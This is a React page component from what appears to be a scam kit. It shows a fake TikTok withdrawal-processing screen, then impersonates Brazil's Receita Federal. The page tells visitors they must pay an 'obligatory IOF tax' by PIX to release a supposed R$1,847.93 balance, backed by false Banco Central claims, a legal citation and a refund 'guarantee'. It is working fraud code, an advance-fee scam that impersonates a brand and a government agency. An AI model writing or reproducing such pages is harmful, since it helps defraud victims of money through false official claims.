import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import tiktokLogo from "@/assets/tiktok-logo-white.svg";
import { Progress } from "@/components/ui/progress";

const Confirm = () => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState<"loading" | "iof">("loading");
  const [iofValue] = useState(32.93);
  const [balance] = useState(1847.93);

  useEffect(() => {
    if (status === "loading") {
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => setStatus("iof"), 500);
            return 100;
          }
          return prev + 2;
        });
      }, 100);
      return () => clearInterval(interval);
    }
  }, [status]);

  const handlePayIOF = () => {
    navigate("/checkout");
  };

  if (status === "loading") {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center">
        <img src={tiktokLogo} alt="TikTok" className="h-12 mb-8" />
        <div className="w-64 mb-4">
          <Progress value={progress} className="h-3 bg-gray-700" />
        </div>
        <p className="text-white text-center">Processando seu saque...</p>
        <p className="text-gray-400 text-sm mt-2">Aguarde enquanto validamos os dados</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
      {/* Header */}
      <header className="bg-blue-900 py-4 flex items-center justify-center gap-3">
        <svg className="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
        </svg>
        <span className="text-white font-semibold text-lg">Receita Federal</span>
      </header>

      {/* Alert Banner */}
      <div className="mx-4 mt-4">
        <div className="bg-orange-100 border-l-4 border-orange-500 p-4 rounded-r-lg flex items-center gap-3">
          <svg className="w-6 h-6 text-orange-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
          </svg>
          <span className="text-orange-800 font-medium">Imposto sobre Operações Financeiras (IOF)</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-6">
        <div className="bg-white rounded-lg w-full max-w-lg shadow-lg">
          {/* Title */}
          <div className="p-6 border-b">
            <h2 className="text-xl font-bold text-gray-900">
              Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
            </h2>
            <p className="text-gray-600 text-sm mt-2">
              Para liberar o valor de saque de <span className="font-semibold">R$ {balance.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>, é necessário o pagamento do Imposto sobre Operações Financeiras (IOF) no valor de <span className="font-semibold text-red-600">R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>.
            </p>
          </div>

          {/* Legal Notice */}
          <div className="p-4 mx-4 mt-4 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-blue-800">
              <span className="font-semibold">Aviso Legal:</span> Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório para a liberação do saldo acumulado. O valor será reembolsado automaticamente junto com o saldo.
            </p>
          </div>

          {/* Summary */}
          <div className="p-4 mx-4 mt-4 bg-gray-50 rounded-lg">
            <h3 className="font-semibold text-gray-900 mb-4">Resumo</h3>
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-600">Valor de saque</span>
                <span className="font-medium">R$ {balance.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-red-600">Valor a ser pago (IOF)</span>
                <span className="text-red-600 font-medium">- R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </div>
              <p className="text-xs text-red-500">*Reembolsado após Aprovação da Conta e Liberação do Saque!</p>
              <div className="border-t pt-3 flex justify-between">
                <span className="font-semibold text-gray-900">Total a receber no PIX</span>
                <span className="font-bold text-gray-900">R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
              </div>
            </div>
            <div className="flex items-start gap-2 mt-4 text-gray-500 text-xs">
              <svg className="w-4 h-4 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
              </svg>
              <span>O pagamento de R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })} será processado via PIX, após a confirmação do pagamento.</span>
            </div>
          </div>

          {/* Guarantee */}
          <div className="p-4 mx-4 mt-4 bg-green-50 border border-green-200 rounded-lg flex items-start gap-3">
            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
              </svg>
            </div>
            <div>
              <p className="font-semibold text-green-900">Garantia de recebimento</p>
              <p className="text-sm text-green-800 mt-1">
                Este processo é regulamentado pelo Banco Central do Brasil. Garantimos que o valor total de R$ {iofValue.toLocaleString("pt-BR", { minimumFractionDigits: 2 })} será creditado diretamente no seu PIX, após o pagamento obrigatório do IOF (Imposto sobre Operações Financeiras).
              </p>
            </div>
          </div>

          {/* Payment Method */}
          <div className="p-4 mx-4 mt-4 bg-teal-50 border border-teal-200 rounded-lg flex items-start gap-3">
            <div className="w-8 h-8 bg-teal-500 rounded-full flex items-center justify-center flex-shrink-0">
              <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
              </svg>
            </div>
            <div>
              <p className="font-semibold text-teal-900">Método de pagamento</p>
              <p className="text-sm text-teal-800 mt-1">
                Pague com <span className="font-semibold">PIX</span>! Os pagamentos são simples, práticos e realizados em segundos.
              </p>
            </div>
          </div>

          {/* CTA */}
          <div className="p-4 mx-4 my-4">
            <button
              onClick={handlePayIOF}
              className="w-full bg-gray-400 text-white py-4 rounded-lg font-semibold hover:bg-gray-500 transition-colors"
            >
              Pagar Imposto (IOF)
            </button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Confirm;
